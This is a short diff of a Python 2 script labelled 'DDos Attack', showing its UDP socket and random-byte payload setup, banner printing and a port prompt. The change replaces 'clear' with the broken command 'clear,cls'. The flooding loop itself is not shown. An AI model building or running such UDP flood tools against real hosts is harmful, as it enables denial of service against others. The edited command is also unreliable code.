@@ -17,7 +17,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
 
-os.system("clear")
+os.system("clear,cls")
 os.system("figlet DDos Attack")
 print
 print "Author   : CxllZ"
@@ -29,7 +29,7 @@ nmap ip
 
 port = input("Port       : ")
 
-os.system("clear")
+os.system("clear,cls")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(1)
